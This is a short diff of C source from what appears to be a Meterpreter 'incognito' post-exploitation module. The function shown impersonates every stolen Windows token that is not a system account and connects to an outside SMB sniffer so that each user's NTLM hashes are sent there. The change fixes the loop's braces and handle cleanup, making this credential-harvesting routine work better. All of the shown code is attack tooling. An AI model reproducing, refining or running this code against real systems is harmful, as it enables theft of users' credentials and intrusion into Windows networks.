@@ -48,26 +48,29 @@ DWORD request_incognito_snarf_hashes(Remote *remote, Packet *packet)
 	}
 
 	// Use every token and get hashes by connecting to SMB sniffer
-	for (i=0;i<num_tokens;i++)
-	if (token_list[i].token)
+	for (i = 0; i < num_tokens; i++)
 	{
-		get_domain_from_token(token_list[i].token, domain_name, BUF_SIZE);
-		// If token is not "useless" local account connect to sniffer
-		if (_stricmp(domain_name, "NT AUTHORITY"))
+		if (token_list[i].token)
 		{
-			// Impersonate token
-			ImpersonateLoggedOnUser(token_list[i].token);
-			
-			// Cancel previous connection to ensure hashes are sent and existing connection isn't reused
-			WNetCancelConnection2A(nr.lpRemoteName, 0, TRUE);
-			
-			// Connect to smb sniffer
-			if (!WNetAddConnection2A(&nr, NULL, NULL, 0))
+			get_domain_from_token(token_list[i].token, domain_name, BUF_SIZE);
+			// If token is not "useless" local account connect to sniffer
+			if (_stricmp(domain_name, "NT AUTHORITY"))
+			{
+				// Impersonate token
+				ImpersonateLoggedOnUser(token_list[i].token);
 
-			// Revert to primary token
-			RevertToSelf();
+				// Cancel previous connection to ensure hashes are sent and existing connection isn't reused
+				WNetCancelConnection2A(nr.lpRemoteName, 0, TRUE);
+
+				// Connect to smb sniffer
+				if (!WNetAddConnection2A(&nr, NULL, NULL, 0))
+				{
+					// Revert to primary token
+					RevertToSelf();
+				}
+			}
+			CloseHandle(token_list[i].token);
 		}
-		CloseHandle(token_list[i].token);
 	}
 
 	packet_transmit_response(ERROR_SUCCESS, remote, response);
@@ -77,7 +80,9 @@ cleanup:
 
 	// Restore token impersonation
 	if (saved_token != INVALID_HANDLE_VALUE)
+	{
 		ImpersonateLoggedOnUser(saved_token);
+	}
 
 	return ERROR_SUCCESS;
 }
